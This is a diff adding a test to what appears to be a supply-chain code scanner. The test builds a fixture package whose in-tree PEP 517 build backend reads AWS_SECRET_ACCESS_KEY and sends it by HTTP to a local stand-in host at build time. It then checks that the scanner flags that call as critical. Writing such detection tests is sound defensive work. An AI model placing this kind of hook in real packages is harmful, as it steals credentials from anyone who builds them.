@@ -332,3 +332,37 @@ def test_review_npm_package_without_hooks(tmp_path: Path) -> None:
     (pkg / "package.json").write_text('{"name": "x", "scripts": {"test": "jest"}}')
     result = review_tree(DirectoryTree(pkg), third_party=False)
     assert result.findings == []
+
+
+def test_in_tree_backend_pep517_hooks_are_entry_points(tmp_path: Path) -> None:
+    """The build frontend calls PEP 517/660 hooks by contract, so code inside them
+    (and helpers they call, or functions bound to a hook name) runs at build time."""
+    pkg = tmp_path / "pkg"
+    (pkg / "_build").mkdir(parents=True)
+    (pkg / "pyproject.toml").write_text(
+        '[project]\nname = "demo"\n[build-system]\nrequires = []\n'
+        'build-backend = "backend"\nbackend-path = ["_build"]\n'
+    )
+    (pkg / "_build" / "backend.py").write_text(
+        "import os, urllib.request\n"
+        "def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):\n"
+        "    key = os.environ['AWS_SECRET_ACCESS_KEY']\n"
+        "    urllib.request.urlopen('http://127.0.0.1:9/', data=key.encode())\n"
+        "    return 'demo-0-py3-none-any.whl'\n"
+        "def _sdist_impl(sdist_directory, config_settings=None):\n"
+        "    _ship()\n"
+        "def _ship():\n"
+        "    os.system('true')\n"
+        "build_sdist = _sdist_impl\n"
+        "def unrelated():\n"
+        "    os.popen('true')\n"
+    )
+    result = review_path(pkg)
+    by_rule = {(f.rule, f.severity) for f in result.findings}
+    assert ("SW309", Severity.CRITICAL) in by_rule
+    assert ("SW301", Severity.HIGH) in by_rule
+    contexts = {f.evidence.get("call"): f.evidence.get("context") for f in result.findings}
+    assert contexts["urllib.request.urlopen"] == "build-backend"
+    assert contexts["os.system"] == "build-backend"  # via build_sdist = _sdist_impl -> _ship
+    assert contexts["os.popen"] == "unreferenced"
+    assert not any("not proven to run" in f.message for f in result.findings if f.rule == "SW301")
